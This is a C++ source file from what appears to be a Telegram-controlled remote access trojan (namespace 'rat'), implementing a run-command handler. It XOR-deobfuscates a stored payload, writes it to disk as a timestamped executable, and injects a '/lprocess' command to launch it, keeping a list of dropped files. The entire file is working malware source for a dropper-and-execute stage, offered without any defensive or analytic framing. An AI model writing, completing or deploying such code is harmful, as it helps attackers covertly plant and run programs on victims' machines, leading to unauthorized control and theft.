#include <vector>
#include <string>
#include <optional>
#include <fstream>
#include <utility>
#include <fmt/format.h>
#include "rat/Handler.hpp"
#include "rat/encryption/encryption.hpp"
#include "rat/handler/debug.hpp"
#include "rat/system.hpp"

namespace rat::handler {

#ifdef _WIN32
constexpr char payload_name_template[] = "{}.exe";
#else
constexpr char payload_name_template[] = "{}.bin";
#endif

static void _preparePayload(std::vector<uint8_t>& Payload_Vector, const std::string& Key_String) {
    HANDLER_DEBUG_LOG("Xoring the payload bytes to deobfuscate it");
    if (!Payload_Vector.empty()) {
        ::rat::encryption::xorData(Payload_Vector.data(), Payload_Vector.size(), Key_String.c_str());
    }
}

// Write bytes to filesystem (binary). Returns {path, optional<error-string>}
// On success: returns {path, std::nullopt}
// On failure: returns {path, error_message}
static std::pair<std::string, std::optional<std::string>>
_writePayloadIntoFilesystem(const std::vector<uint8_t>& Payload_Bytes) {
    const std::string time_stamp = ::rat::system::getCurrentDateTime_Underscored();
    const std::string payload_path_string = fmt::format(payload_name_template, time_stamp);

    std::ofstream out;
    try {
        // open in binary and throw exceptions on failure
        out.exceptions(std::ofstream::failbit | std::ofstream::badbit);
        out.open(payload_path_string, std::ios::binary);

        HANDLER_DEBUG_LOG("Writing deobfuscated payload bytes into the file system {}", payload_path_string);

        if (!Payload_Bytes.empty()) {
            out.write(reinterpret_cast<const char*>(Payload_Bytes.data()),
                      static_cast<std::streamsize>(Payload_Bytes.size()));
        } else {
            // create empty file (out.open already did)
        }

        out.close();
        return { payload_path_string, std::nullopt };
    } catch (const std::exception& e) {
        HANDLER_ERROR_LOG("Failed at writing the deobfuscated payload into the file system {}: {}", payload_path_string, e.what());
        // Return error as string for easier storage / logging
        return { payload_path_string, std::optional<std::string>(e.what()) };
    }
}

void Handler::handleRunCommand() {
	{
		std::vector<uint8_t> copied_payload(this->state.payload);
		const std::string& key = this->state.payload_key; // copy key too

		_preparePayload(copied_payload, key);

		const auto [payload_path, maybe_error] = _writePayloadIntoFilesystem(copied_payload);

		if (maybe_error) {
			HANDLER_ERROR_LOG("Cannot execute run command because payload write failed: {}", maybe_error.value());
			return;
		}
		this->telegram_update->message.text =
			fmt::format("/lprocess {}", payload_path);
		this->parseTelegramMessageToCommand();
		this->written_files.push_back(payload_path);
		HANDLER_DEBUG_LOG("Payload written to {}, now launching process.", payload_path);
	}
	HANDLER_DEBUG_LOG("Proceeding to process the command now");
	this->handleProcessCommand();
}
}//namespace rat::handler
